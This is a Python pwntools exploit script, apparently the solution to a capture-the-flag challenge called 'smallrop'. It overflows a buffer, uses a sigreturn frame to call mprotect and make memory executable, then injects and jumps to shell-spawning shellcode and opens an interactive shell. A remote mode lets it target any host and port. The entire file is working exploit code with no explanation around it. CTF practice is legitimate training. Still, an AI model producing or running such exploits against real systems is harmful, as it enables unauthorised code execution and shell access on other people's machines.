#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('smallrop')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *vuln+55
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    offset = 128
    syscall = 0x40100a # syscall; 

    frame = SigreturnFrame()
    frame.rax = 0xa
    frame.rdi = 0x400000
    frame.rsi = 0x1000
    frame.rdx = 0x7
    frame.rip = syscall
    frame.rsp = 0x400000+0x100

    payload = flat({
        offset: [
            exe.sym["vuln"]+34,
        ]
    })
    payload += b"A"*0x80
    payload += p64(syscall)
    payload += bytes(frame)

    io.sendafter(b">", payload)
    io.send(b"A"*0xf)

    payload = asm(shellcraft.sh())
    payload = payload.ljust(offset, b"\x90")
    payload += p64(0x400080)
    sleep(1)
    io.recvuntil(b">")
    io.sendline(payload)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()
